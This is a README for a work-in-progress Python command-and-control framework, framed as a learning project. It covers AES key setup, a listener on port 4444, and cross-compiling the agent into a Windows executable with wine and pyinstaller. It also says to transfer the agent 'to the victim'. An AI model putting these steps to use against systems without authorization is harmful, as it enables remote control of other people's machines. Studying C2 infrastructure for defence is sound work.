# G-r00t C2 project

This is a work in progress project. The goal is to learn more about C2 communications infrastructure.

## Disclaimer

This Command and Control (C2) tool is developed solely for educational and research purposes. It is intended to help users understand the principles of C2 communication, cybersecurity testing, and network security in a controlled and lawful environment.

### Usage Policy

This tool is strictly for learning and authorized testing purposes only.
Unauthorized use against any system, network, or individual without explicit permission is illegal and strictly prohibited.

The author does not condone, endorse, or support any malicious activities. Misuse of this tool to target networks, systems, or devices without consent may result in legal consequences. The author and contributors assume no responsibility for any damages or legal issues caused by misuse.
Responsible Usage

By using this tool, you agree to use it responsibly and legally within the bounds of ethical hacking, training, or research in a controlled environment.

## Encryption setup

This C2 framework uses AES encryption for communication.
The first step is to generate the secrets (key and IV) and add them to the agent and sevrer python script. 
To generate the secrets you can use the provided secretsGenerator.py script. 

Once the secrets are generated you will need to add them to agent.py and server.py

## Server

The server by default lsiten to 0.0.0.0:4444.
You can change this in the variables host and port.
Once done you can just run it with python.

## Agent cross-compiling 

To crosscompile the agent for Windows I used wine. 
You can follow this guide to setup Python and pyinstaller in wine: 

https://www.makeworld.space/2021/10/linux-wine-pyinstaller.html

Once the environment in wine is setup you will need to install the requirements:

```
wine C:/path/to/python.exe -m pip install -r requirements.txt
```

To compile the agent you can run:

```
wine C:/path/to/Scripts/pyinstaller.exe --onefile --add-binary "C:/path//to/python38.dll;." --name agent agent.py
```

Once the agent is compiled, you will find the executable in the dist/ folder.  
You can now transfer it to the victim and use it by specifying the IP and PORT of the server:

```
agent.py <SERVER_IP> <SERVER_PORT>
```



## To do list:


- Integrate pinggy
- Implement Telegram as an Additional Channel
- Extra functionalities
  -   Upload download files sunctionalities